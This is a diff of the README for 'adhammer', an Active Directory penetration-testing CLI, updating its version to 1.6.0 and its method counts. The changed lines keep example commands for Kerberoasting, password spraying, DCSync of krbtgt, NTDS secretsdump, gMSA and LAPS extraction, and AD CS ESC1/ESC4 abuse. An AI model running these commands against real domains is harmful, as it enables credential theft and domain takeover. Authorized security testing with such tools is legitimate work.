@@ -14,7 +14,7 @@
   &nbsp;·&nbsp;
   <a href="#quick-start"><strong>QUICK START</strong></a>
   &nbsp;·&nbsp;
-  <a href="#cli-methods-76"><strong>CLI METHODS</strong></a>
+  <a href="#cli-methods-74"><strong>CLI METHODS</strong></a>
   &nbsp;·&nbsp;
   <a href="#10-starting-workflows"><strong>10 STARTING WORKFLOWS</strong></a>
   &nbsp;·&nbsp;
@@ -90,7 +90,7 @@ Use only systems you own or are explicitly authorized to test. Read the
 
 <br />
 
-## What ships in v1.5.2
+## What ships in v1.6.0
 
 Modernizes the tool for **Windows Server 2025 / KB5014754** engagements and
 tightens every operator-visible error path.
@@ -174,7 +174,7 @@ Wider ecosystem: [icedracon's repositories](https://github.com/icedracon?tab=rep
 
 Ten selected workflows for authorized discovery and configuration review—not
 a usage ranking or a claim that these are the most popular commands. The full
-74-method catalog follows below. Examples were checked against v1.5.2 source;
+74-method catalog follows below. Examples were checked against v1.6.0 source;
 they are not new live-validation receipts.
 
 Replace `example.test` hosts and account names only within your approved scope.
@@ -195,7 +195,7 @@ adhammer doctor --domain example.test --dc dc.example.test --timeout 3 --json
 DNS SRV discovery and TCP probes, without credentials. Read `checks`, `ran`,
 `failed`, and `verdict`; a skipped bind does not establish authentication.
 
-### 2. Check a workstation's reachable services · new in 1.5.2
+### 2. Check a workstation's reachable services
 
 ```sh
 adhammer doctor --client workstation.example.test --timeout 3 --json
@@ -282,9 +282,9 @@ or stale objects can affect the result; validate the inventory with its owners.
 
 </details>
 
-## CLI methods (76)
+## CLI methods (74)
 
-The existing 76-method catalog is retained below. Its lab values are examples,
+The 74-method catalog is retained below. Its lab values are examples,
 not approved targets; `.local` names can resolve in real environments. Do not
 paste these commands unchanged. Review scope, impact, and the validation ledger
 first; `--insecure` disables certificate verification and is not a production
@@ -331,17 +331,17 @@ default. Full help on any verb:
 | `enum ldap-users` | Anonymous LDAP user listing | `adhammer enum ldap-users --url ldap://dc.corp.local --anon` |
 | `enum anon-services` | rsync / FTP / TFTP anonymous probes | `adhammer enum anon-services --host 192.0.2.10` |
 
-### attack (36) — active, grouped by intent
+### attack (34) — active, grouped by intent
 
 <details open>
-<summary><strong>Kerberos & credentials (10)</strong> — roast, spray, TGT, DCSync, dumps, hash unmasks</summary>
+<summary><strong>Kerberos & credentials (9)</strong> — roast, spray, TGT, DCSync, dumps, hash unmasks</summary>
 
 | Verb | What it does | Example |
 |:--|:--|:--|
 | `attack roast` | AS-REP roast + Kerberoast (hashcat output) | `adhammer attack roast --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure --kdc dc.corp.local` |
 | `attack spray` | Kerberos password spray + user enum | `adhammer attack spray --kdc dc.corp.local --realm CORP.LOCAL --userlist users.txt --password 'Winter2026!'` |
 | `attack asktgt` | Ask-TGT → reusable ccache | `adhammer attack asktgt --user Administrator --realm CORP.LOCAL --kdc dc.corp.local --password @file:./pw --out admin.ccache` |
-| `attack dcsync` | DRSUAPI replication → creds (password OR **`--nt-hash`** — 1.5.2) | `adhammer attack dcsync --host dc.corp.local --domain corp.local --user Administrator --nt-hash @file:./admin.nt --target krbtgt` |
+| `attack dcsync` | DRSUAPI replication → creds (password OR **`--nt-hash`**) | `adhammer attack dcsync --host dc.corp.local --domain corp.local --user Administrator --nt-hash @file:./admin.nt --target krbtgt` |
 | `attack secretsdump` | Full SAM/LSA/NTDS dump | `adhammer attack secretsdump --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw` |
 | `attack gmsa` | gMSA managed-password extraction | `adhammer attack gmsa --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure --target gmsa_svc` |
 | `attack laps` | LAPS password read | `adhammer attack laps --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure` |
@@ -379,7 +379,7 @@ default. Full help on any verb:
 
 | Verb | What it does | Example |
 |:--|:--|:--|
-| `attack esc1` | AD CS ESC1 chain + optional PKINIT (**auto-`--sid`** on 1.5.2) | `adhammer attack esc1 --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw --ca CORP-CA --template VulnUser --upn 'Administrator@corp.local' --pkinit --kdc dc.corp.local` |
+| `attack esc1` | AD CS ESC1 chain + optional PKINIT (**auto-`--sid`**) | `adhammer attack esc1 --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw --ca CORP-CA --template VulnUser --upn 'Administrator@corp.local' --pkinit --kdc dc.corp.local` |
 | `attack icpr-esc1` | Direct ICPR path (ESC1/3/6/15) with **`--sid`** support | `adhammer attack icpr-esc1 --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw --ca CORP-CA --template VulnUser --target-upn 'Administrator@corp.local' --sid S-1-5-21-1-2-3-500 --out esc1.pfx` |
 | `attack esc4` | ESC4 template-DACL modify → ESC1 chain | `adhammer attack esc4 --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure --template VulnTemplate --commit` |
 
